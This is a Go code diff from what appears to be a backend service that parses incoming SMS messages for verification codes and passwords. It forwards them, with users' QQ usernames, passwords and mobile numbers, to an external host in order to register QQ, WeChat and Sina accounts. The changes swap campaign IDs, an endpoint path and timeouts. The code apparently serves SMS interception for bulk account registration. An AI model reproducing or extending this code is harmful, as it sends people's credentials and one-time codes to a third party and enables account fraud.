@@ -110,7 +110,7 @@ func processQqRegister(msg string, user map[string]string) {
 			mobile := formatMobile(user["mobile"])
 			//生成要访问的url
 			// url := "http://localhost:8090/ss/testc?smsContent=" + smsContent
-			url := "http://zy.ardgame18.com:8080/verifycode/api/getQQVerifyCode.jsp?cid=qq114&pid=114&username=" + qq + "&passwd=" + pwd + "&mobile=" + mobile + "&ccpara="
+			url := "http://zy.ardgame18.com:8080/verifycode/api/getQQVerifyCode.jsp?cid=c115&pid=114&username=" + qq + "&passwd=" + pwd + "&mobile=" + mobile + "&ccpara="
 			go send2Url(url)
 			go updateRegisterUserSuccess(user, "registerQqSuccessCount")
 		}
@@ -140,7 +140,7 @@ func processWechatRegister(msg string, user map[string]string, apid string) {
 		log.Println(result[1])
 		pwd := result[1]
 		mobile := formatMobile(user["mobile"])
-		url := "http://zy.ardgame18.com:8080/verifycode/api/getWXChCode.jsp?cid=wx109&pid=wxp109&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara="
+		url := "http://zy.ardgame18.com:8080/verifycode/api/getWXChCode.jsp?cid=c115&pid=wxp109&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara="
 		go send2Url(url)
 		go updateRelationSuccess(user, apid)
 	} else {
@@ -197,7 +197,7 @@ func processJindongRegister(msg string, user map[string]string, apid string) {
 }
 func processSinaRegister(msg string, user map[string]string, apid string) {
 	mobile := formatMobile(user["mobile"])
-	url := "http://zy.ardgame18.com:8080/verifycode/api/getJDNET.jsp?cid=c115&pid=web115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
+	url := "http://zy.ardgame18.com:8080/verifycode/api/getSNWeb.jsp?cid=c115&pid=web115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
 	go send2Url(url)
 	go updateRelationSuccess(user, apid)
 }
@@ -689,8 +689,8 @@ func main() {
 	}()
 	server := &http.Server{
 		Addr:         ":8090",
-		ReadTimeout:  3 * time.Second,
-		WriteTimeout: 5 * time.Second,
+		ReadTimeout:  16 * time.Second,
+		WriteTimeout: 16 * time.Second,
 	}
 	http.HandleFunc("/ss/sendc", sendC)
 	http.HandleFunc("/ss/getc", getC)
